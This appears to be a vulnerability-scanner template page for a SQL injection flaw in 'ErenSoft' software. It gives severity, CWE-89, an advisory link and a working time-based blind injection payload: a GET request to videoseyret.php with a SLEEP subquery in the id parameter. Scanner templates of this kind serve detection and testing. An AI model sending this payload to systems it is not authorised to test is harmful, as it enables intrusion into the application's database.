# Nuclei Template: ErenSoft - SQL Injection
**Template ID:** erensoft-sqli
**Vulnerability Class:** SQL Injection
**Severity:** High
**CWE:** CWE-89
**Source:** Nuclei Template (`erensoft-sqli.yaml`)

## Vulnerability Information & PoC

## Description
SQL Injection is a type of SQL injection attack in which an attacker can exploit a vulnerability in a web application's input fields to manipulate the application's SQL queries.

## Steps to reproduce / Exploit Payload
```http
@timeout: 20s
GET /videoseyret.php?id=95%20AND%20(SELECT%204581%20FROM%20(SELECT(SLEEP(6)))NyiX) HTTP/1.1
Host: {{Hostname}}
```

## References
- https://cxsecurity.com/issue/WLB-2023070055
